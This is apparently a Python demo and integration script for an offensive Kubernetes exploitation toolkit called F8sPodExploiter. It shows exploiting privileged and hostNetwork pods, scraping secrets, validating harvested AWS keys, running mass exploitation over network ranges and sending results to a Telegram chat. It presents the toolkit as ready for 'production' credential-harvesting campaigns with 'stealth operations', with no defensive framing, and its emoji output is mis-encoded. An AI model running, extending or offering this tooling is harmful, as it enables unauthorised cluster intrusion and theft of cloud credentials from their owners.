#!/usr/bin/env python3
"""
F8sPodExploiter Integration Example
Demonstrates integration with existing K8sExploitMaster and ProductionK8sHarvester
Author: wKayaa | Demo Version | 2025-06-24
"""

import asyncio
import json
from datetime import datetime

# Import our new F8sPodExploiter
from f8s_exploit_pod import (
    F8sPodExploiter, 
    integrate_with_k8s_exploit_master,
    integrate_with_production_harvester
)

async def demo_standalone_usage():
    """Demonstrate standalone F8sPodExploiter usage"""
    print("üöÄ F8sPodExploiter Standalone Demo")
    print("=" * 50)
    
    # Initialize with Telegram integration (optional)
    exploiter = F8sPodExploiter(
        telegram_token="1234567890:AAEXAMPLEaBcDeF123456789",  # Example token
        telegram_chat_id="-1001234567890"  # Example chat ID
    )
    
    # Demo individual methods
    print("\nüîç Testing individual exploitation methods:")
    
    # 1. Host network exploitation
    vulnerable_pod = {
        'metadata': {'name': 'vulnerable-nginx'},
        'spec': {
            'hostNetwork': True,
            'hostPID': True,
            'containers': [{
                'name': 'nginx',
                'securityContext': {
                    'privileged': True,
                    'capabilities': {'add': ['SYS_ADMIN', 'NET_ADMIN']}
                }
            }]
        }
    }
    
    hostnet_result = await exploiter.exploit_hostnetwork(vulnerable_pod)
    print(f"   ‚úÖ hostNetwork exploit: {hostnet_result.success} ({hostnet_result.severity.value})")
    
    # 2. Secret scraping
    secrets = await exploiter.scrape_secrets("nginx-pod", "production")
    print(f"   ‚úÖ Secret scraping: Found {len(secrets)} secrets")
    
    # 3. AWS credential validation
    aws_creds = {
        'access_key': 'AKIA1234567890EXAMPLE',
        'secret_key': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
    }
    validation = await exploiter.validate_aws_credentials(aws_creds)
    print(f"   ‚úÖ AWS validation: {validation.valid} (Permissions: {len(validation.permissions)})")
    
    # 4. Privilege escalation check
    escalation_paths = await exploiter.check_privilege_escalation("https://prod-k8s.example.com")
    print(f"   ‚úÖ Privilege escalation: Found {len(escalation_paths)} paths")
    
    return exploiter

async def demo_k8s_exploit_master_integration():
    """Demonstrate integration with K8sExploitMaster"""
    print("\nüîó K8sExploitMaster Integration Demo")
    print("=" * 50)
    
    # Simulate K8sExploitMaster results
    k8s_master_results = {
        'session_id': 'k8s-master-abc123',
        'exploited_clusters': [
            {
                'endpoint': 'https://cluster1.prod.example.com',
                'status': 'exploited',
                'credentials_found': ['aws-key-1', 'smtp-config']
            },
            {
                'endpoint': 'https://cluster2.staging.example.com', 
                'status': 'accessible',
                'vulnerabilities': ['hostNetwork', 'privileged']
            }
        ],
        'stats': {
            'clusters_scanned': 15,
            'clusters_exploited': 2,
            'credentials_found': 8
        }
    }
    
    # Initialize F8sPodExploiter  
    f8s_exploiter = F8sPodExploiter()
    
    # Integrate with K8sExploitMaster results
    integration_results = await integrate_with_k8s_exploit_master(f8s_exploiter, k8s_master_results)
    
    print(f"‚úÖ Integration completed for {len(k8s_master_results['exploited_clusters'])} clusters")
    print(f"üìä F8S Session: {integration_results['f8s_session']}")
    print(f"üéØ Enhanced exploitation data available for each cluster")
    
    return integration_results

async def demo_production_harvester_integration():
    """Demonstrate integration with ProductionK8sHarvester"""
    print("\nüîó ProductionK8sHarvester Integration Demo")
    print("=" * 50)
    
    # Simulate ProductionK8sHarvester cluster targets
    harvester_clusters = [
        {
            'endpoint': 'https://prod-east.k8s.company.com',
            'accessible': True,
            'token': 'eyJhbGciOiJSUzI1NiIs...',
            'privileged_access': True
        },
        {
            'endpoint': 'https://prod-west.k8s.company.com',
            'accessible': True,
            'token': None,
            'privileged_access': False
        },
        {
            'endpoint': 'https://dev.k8s.company.com',
            'accessible': True,
            'token': 'eyJhbGciOiJIUzI1NiIs...',
            'privileged_access': True
        }
    ]
    
    # Initialize F8sPodExploiter
    f8s_exploiter = F8sPodExploiter()
    
    # Integrate with harvester clusters
    integration_results = await integrate_with_production_harvester(f8s_exploiter, harvester_clusters)
    
    accessible_clusters = [c for c in harvester_clusters if c['accessible']]
    print(f"‚úÖ Integration completed for {len(accessible_clusters)} accessible clusters")
    print(f"üìä F8S Session: {integration_results['f8s_session']}")
    
    return integration_results

async def demo_comprehensive_campaign():
    """Demonstrate comprehensive exploitation campaign"""
    print("\nüéØ Comprehensive Exploitation Campaign Demo")
    print("=" * 50)
    
    # Initialize F8sPodExploiter with Telegram
    exploiter = F8sPodExploiter(
        telegram_token="demo_token",
        telegram_chat_id="demo_chat"
    )
    
    # Run comprehensive campaign
    campaign_results = await exploiter.run_comprehensive_exploitation(
        cluster_endpoint="https://demo-cluster.example.com",
        target_pods=["web-app", "api-server", "database"]
    )
    
    print(f"‚úÖ Campaign completed: {campaign_results['success']}")
    print(f"üéØ Target: {campaign_results['target']}")
    print(f"üìä Statistics:")
    stats = campaign_results['statistics']
    for key, value in stats.items():
        print(f"   - {key.replace('_', ' ').title()}: {value}")
    
    return campaign_results

def demo_framework_integration_patterns():
    """Show integration patterns with existing framework classes"""
    print("\nüèóÔ∏è Framework Integration Patterns")
    print("=" * 50)
    
    integration_code = '''
# Integration with K8sExploitMaster
from k8s_exploit_master import K8sExploitMaster
from f8s_exploit_pod import F8sPodExploiter

async def enhanced_k8s_exploitation():
    # Initialize both frameworks
    k8s_master = K8sExploitMaster()
    f8s_exploiter = F8sPodExploiter()
    
    # Run K8sExploitMaster first for discovery
    targets = ["10.0.0.0/16", "192.168.1.0/24"]
    k8s_results = await k8s_master.run_mass_exploitation(targets)
    
    # Use F8S for enhanced pod-level exploitation
    for cluster in k8s_results.exploited_clusters:
        enhanced_results = await f8s_exploiter.run_comprehensive_exploitation(
            cluster_endpoint=cluster.endpoint
        )
        # Enhanced results include detailed pod analysis, 
        # advanced secret extraction, and real-time validation

# Integration with ProductionK8sHarvester  
from k8s_production_harvester import KubernetesExploiter
from f8s_exploit_pod import F8sPodExploiter

async def production_enhanced_harvesting():
    # Initialize harvester and F8S
    harvester = KubernetesExploiter()
    f8s_exploiter = F8sPodExploiter()
    
    # Discover and access clusters
    cluster_targets = await harvester.discover_clusters(targets)
    accessible = await harvester.verify_cluster_access(cluster_targets)
    
    # Deploy exploitation pods
    for cluster in accessible:
        await harvester.deploy_exploitation_pod(cluster)
        
        # Enhanced exploitation with F8S
        f8s_results = await f8s_exploiter.run_comprehensive_exploitation(
            cluster_endpoint=cluster.endpoint
        )
        # F8S provides deeper pod analysis and stealth operations

# Integration with WWYVQMasterFramework
from wwyvq_master_final import WWYVQMasterFramework
from f8s_exploit_pod import F8sPodExploiter

class EnhancedWWYVQMaster(WWYVQMasterFramework):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.f8s_exploiter = F8sPodExploiter(
            telegram_token=self.telegram_notifier.token,
            telegram_chat_id=self.telegram_notifier.chat_id
        )
    
    async def _run_k8s_mode_enhanced(self, targets):
        # Run original K8s exploitation
        k8s_results = await self._run_k8s_mode(targets)
        
        # Enhance with F8S pod-level exploitation
        for cluster_endpoint in k8s_results.get('clusters', []):
            f8s_enhanced = await self.f8s_exploiter.run_comprehensive_exploitation(
                cluster_endpoint=cluster_endpoint
            )
            k8s_results[f'f8s_enhanced_{cluster_endpoint}'] = f8s_enhanced
        
        return k8s_results
'''
    
    print("üìã Framework Integration Code Patterns:")
    print("   - K8sExploitMaster: Enhanced discovery + F8S pod exploitation")
    print("   - ProductionK8sHarvester: Production access + F8S stealth operations")  
    print("   - WWYVQMasterFramework: Unified framework + F8S comprehensive analysis")
    print("\nüí° F8sPodExploiter provides modular enhancement to existing workflows")

async def main():
    """Main demonstration"""
    print("üöÄ F8sPodExploiter Integration Demonstration")
    print("Author: wKayaa | Version: 1.0.0")
    print("=" * 70)
    
    # Run demonstrations
    print("\nüìã Running integration demonstrations...")
    
    # 1. Standalone usage
    exploiter = await demo_standalone_usage()
    
    # 2. K8sExploitMaster integration  
    k8s_integration = await demo_k8s_exploit_master_integration()
    
    # 3. ProductionK8sHarvester integration
    harvester_integration = await demo_production_harvester_integration()
    
    # 4. Comprehensive campaign
    campaign_results = await demo_comprehensive_campaign()
    
    # 5. Framework integration patterns
    demo_framework_integration_patterns()
    
    # Final summary
    print("\n" + "=" * 70)
    print("‚úÖ F8sPodExploiter Integration Demo Complete")
    print("\nüìä Summary:")
    print(f"   - Standalone methods: All functional ‚úÖ")
    print(f"   - K8sExploitMaster integration: Ready ‚úÖ")
    print(f"   - ProductionK8sHarvester integration: Ready ‚úÖ")
    print(f"   - Comprehensive campaigns: Functional ‚úÖ")
    print(f"   - Framework patterns: Documented ‚úÖ")
    
    print("\nüéØ F8sPodExploiter is ready for production integration!")
    print("   - Single file: f8s_exploit_pod.py (765 lines)")
    print("   - Minimal dependencies: requests, json, asyncio only")
    print("   - Modular architecture with async methods")
    print("   - Production-safe with cleanup and rate limiting")
    print("   - Rich Telegram notifications")
    print("   - Real-time AWS credential validation")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n‚èπÔ∏è Demo interrupted by user")
    except Exception as e:
        print(f"‚ùå Demo failed: {e}")